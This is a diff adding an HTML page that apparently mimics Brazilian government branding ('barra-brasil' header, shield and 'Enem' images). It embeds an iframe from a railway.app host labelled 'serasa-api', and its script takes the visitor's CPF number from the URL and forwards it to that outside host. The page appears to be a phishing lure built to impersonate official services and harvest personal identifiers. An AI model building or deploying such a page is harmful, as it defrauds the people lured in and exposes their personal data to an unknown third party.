@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta name="viewport" content="minimum-scale=1,initial-scale=1,width=device-width,shrink-to-fit=no">
+
+    <style type="text/css">
+        .css-kzkx1t {
+            margin-top: 0;
+        }
+        /* Estilo para o rodapé */
+        #rodape {
+            background-color: #f70e7bf1; /* Cor do cabeçalho */
+            height: 30px; /* Altura do rodapé */
+            border-top: 2px solid #f70e7bf1; /* Borda de 2px com a mesma cor do cabeçalho */
+            display: flex; /* Para centralizar o texto verticalmente */
+            justify-content: center; /* Para centralizar o texto horizontalmente */
+            align-items: center; /* Para centralizar o texto verticalmente */
+        }
+    </style>
+    <link rel="stylesheet" href="style.css" />
+    <style type="text/css">
+        .css-kzkx1t {
+            margin-top: 0;
+        }
+        /* Estilo para o cabeçalho */
+        #barra-brasil {
+            height: 70px; /* Altura do cabeçalho */
+            background-image: url('br/images/image.png'), url('br/images/shield.png'), url('br/images/1000_F_225221877_9x7repcZzz4ryhvZ4Z5DmlnnCTdTUImT-removebg-preview.png'); /* Definição das imagens */
+            background-size: 20%, 8%, 10%; /* Tamanho das imagens */
+            background-repeat: no-repeat, no-repeat, no-repeat; /* Evita repetição das imagens */
+            background-position: center center, right center, left center; /* Alinha as imagens */
+            display: flex; /* Para alinhar os elementos verticalmente */
+            align-items: center; /* Para alinhar os elementos verticalmente */
+            padding-left: 20px; /* Espaçamento à esquerda */
+        }
+        
+        /* Estilo para as imagens no cabeçalho */
+        .icone {
+            width: 20px; /* Largura da imagem */
+            height: 20px; /* Altura da imagem */
+            margin-right: 10px; /* Espaçamento entre as imagens */
+            margin-left: 10px; /* Espaçamento entre as imagens */
+        }
+    </style>
+</head>
+<body>
+    <!-- Cabeçalho -->
+    <div id="barra-brasil">
+        <!-- Imagem à esquerda -->
+        <div class="icone" style="background-image: url('br/images/image.png')"></div>
+        <!-- Imagem no centro -->
+        <div class="icone" style="background-image: url('br/images/shield.png')"></div>
+        <!-- Imagem à direita -->
+        <div class="icone" style="background-image: url('br/images/seta.png')"></div>
+    </div>
+    <div class="css-14le3h7"><img src="br/images/Screenshot_110-removebg-preview-1-768x275.png" height="90"alt="Enem"></div>
+    <div class="css-14le3h8"><img src="br/images/costuma responder em 2 minutos.png" height="60"alt="Enem"></div>
+
+    <div class="box-com-bordas">
+        <div class="css-kzkx1t" style="opacity: 2;">
+            <div class="css-1pojmvr">
+                <div class="css-1c88qfb">
+                    <iframe id="myIframe" src="https://viewer-production-6ed8.up.railway.app/serasa-api-0exwgek"></iframe>
+                </div>
+            </div>
+        </div>
+    </div>
+     
+
+
+    
+<script>
+// Função para extrair parâmetros da URL
+function getURLParameter(name) {
+    const searchParams = new URLSearchParams(window.location.search);
+    return searchParams.get(name);
+}
+
+// Capturando o parâmetro 'cpf'
+const cpf = getURLParameter('cpf');
+
+// Verificando se o parâmetro existe
+if (cpf) {
+    const iframe = document.getElementById('myIframe');
+    // Adicionando o parâmetro 'cpf' ao 'src' do iframe
+    iframe.src += (iframe.src.includes('?') ? '&' : '?') + `cpf=${cpf}`;
+}
+</script>
+
+</body>
+</html>
